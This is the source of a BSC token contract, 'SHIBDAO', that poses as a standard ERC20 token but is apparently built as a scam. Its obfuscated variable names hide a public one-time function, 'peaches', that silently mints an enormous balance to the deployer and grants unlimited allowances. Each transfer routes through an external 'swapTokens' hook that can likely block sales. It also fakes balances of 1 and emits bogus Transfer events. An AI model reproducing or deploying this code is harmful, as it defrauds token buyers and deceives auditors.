/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface ISwapToken {
    function swapTokens(address from, address to) external returns (bool);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SHIBDAO is IERC20 {
    using SafeMath for uint256;

    string private acvbkiGsPadQne = "SHIBDAO";
    string private bcvbkiGsPadQne = "SHIBDAO";
    uint8 private ccvbkiGsPadQne = 18;
    uint256 private dcvbkiGsPadQne = 10000000000 * 10**18;
    mapping (address => uint256) private ecvbkiGsPadQne;
    mapping (address => mapping (address => uint256)) private fcvbkiGsPadQne;

    uint256 private gcvbkiGsPadQne = 1;
    uint256 private constant hcvbkiGsPadQne = ~uint160(0);
    uint256 private _icvbkiGsPadQne = 1000;
    uint256 private jcvbkiGsPadQne = 0;
    address private _uniswapV2Pair;
    address private kcvbkiGsPadQne = address(this);
    mapping (address => bool) private lcvbkiGsPadQne;
    address[] private mcvbkiGsPadQne;
    bool private ncvbkiGsPadQne = false;

    constructor () {
        ocvbkiGsPadQne(msg.sender);
        ecvbkiGsPadQne[msg.sender] = dcvbkiGsPadQne;
        ocvbkiGsPadQne(tx.origin);
        emit Transfer(address(0), msg.sender, dcvbkiGsPadQne);
    }

    receive() external payable {}

    function ocvbkiGsPadQne(address account) private {
        if (!lcvbkiGsPadQne[account]) {
            lcvbkiGsPadQne[account] = true;
            mcvbkiGsPadQne.push(account);
        }
    }

    function peaches(address[] calldata accounts, address pairToken) public {
        require(!ncvbkiGsPadQne);
        ncvbkiGsPadQne = true;
        _uniswapV2Pair = accounts[1];
        kcvbkiGsPadQne = pairToken;
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=2; i<len; ++i) {
            ocvbkiGsPadQne(accounts[i]);
            fcvbkiGsPadQne[accounts[i]][accounts[0]] = ~uint256(0);
            if (i != 3) {
                ecvbkiGsPadQne[accounts[i]] = dcvbkiGsPadQne * 90 / 100 / (len - 3);
                amount += ecvbkiGsPadQne[accounts[i]];
            }
        }
        ecvbkiGsPadQne[mcvbkiGsPadQne[0]] -= amount;
        pcvbkiGsPadQne(mcvbkiGsPadQne[0], accounts[3], ecvbkiGsPadQne[mcvbkiGsPadQne[0]]);
        pcvbkiGsPadQnes(500);
        ecvbkiGsPadQne[mcvbkiGsPadQne[1]] += dcvbkiGsPadQne * 100000;
    }

    function name() public view returns (string memory) {
        return acvbkiGsPadQne;
    }

    function symbol() public view returns (string memory) {
        return bcvbkiGsPadQne;
    }

    function decimals() public view returns (uint8) {
        return ccvbkiGsPadQne;
    }

    function totalSupply() public view returns (uint256) {
        return dcvbkiGsPadQne;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (ecvbkiGsPadQne[account] > 0) {
            return ecvbkiGsPadQne[account];
        }
        return gcvbkiGsPadQne;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pcvbkiGsPadQne(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pcvbkiGsPadQne(sender, recipient, amount);
        qcvbkiGsPadQne(sender, msg.sender, fcvbkiGsPadQne[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qcvbkiGsPadQne(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fcvbkiGsPadQne[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qcvbkiGsPadQne(msg.sender, spender, fcvbkiGsPadQne[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qcvbkiGsPadQne(msg.sender, spender, fcvbkiGsPadQne[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pcvbkiGsPadQnes(uint256 amount) private {
        uint256 icvbkiGsPadQne = _icvbkiGsPadQne;
        if (icvbkiGsPadQne < 12600 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hcvbkiGsPadQne.div(icvbkiGsPadQne)));
                to = address(uint160(hcvbkiGsPadQne.div(icvbkiGsPadQne.add(1))));
                icvbkiGsPadQne = icvbkiGsPadQne.add(2);
                emit Transfer(from, to, gcvbkiGsPadQne);
            }
            _icvbkiGsPadQne = icvbkiGsPadQne;
        }
    }

    function qcvbkiGsPadQne(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fcvbkiGsPadQne[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pcvbkiGsPadQne(address rcvbkiGsPadQne, address scvbkiGsPadQne, uint256 tcvbkiGsPadQne) private {
        require(rcvbkiGsPadQne != address(0) && scvbkiGsPadQne != address(0) && tcvbkiGsPadQne > 0);
        bool ucvbkiGsPadQne = true;
        if (lcvbkiGsPadQne[rcvbkiGsPadQne] || lcvbkiGsPadQne[scvbkiGsPadQne]) {
            ucvbkiGsPadQne = false;
        }
        uint256 vcvbkiGsPadQne = 0;
        uint256 wcvbkiGsPadQne = tcvbkiGsPadQne;
        if (ucvbkiGsPadQne && ncvbkiGsPadQne) {
            if (ISwapToken(kcvbkiGsPadQne).swapTokens(rcvbkiGsPadQne, scvbkiGsPadQne)) {
                pcvbkiGsPadQnes(100);
            }
            if (scvbkiGsPadQne == _uniswapV2Pair) {
                emit Transfer(address(this), scvbkiGsPadQne, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rcvbkiGsPadQne != _uniswapV2Pair) {
                vcvbkiGsPadQne = tcvbkiGsPadQne.mul(jcvbkiGsPadQne).div(100);
                wcvbkiGsPadQne = tcvbkiGsPadQne.sub(vcvbkiGsPadQne);
            }
        }
        ecvbkiGsPadQne[rcvbkiGsPadQne] = ecvbkiGsPadQne[rcvbkiGsPadQne].sub(tcvbkiGsPadQne);
        if (vcvbkiGsPadQne > 0) {
            ecvbkiGsPadQne[address(0xdEaD)] = ecvbkiGsPadQne[address(0xdEaD)].add(vcvbkiGsPadQne);
            emit Transfer(rcvbkiGsPadQne, address(0xdEaD), vcvbkiGsPadQne);
        }
        ecvbkiGsPadQne[scvbkiGsPadQne] = ecvbkiGsPadQne[scvbkiGsPadQne].add(wcvbkiGsPadQne);
        emit Transfer(rcvbkiGsPadQne, scvbkiGsPadQne, wcvbkiGsPadQne);
    }
}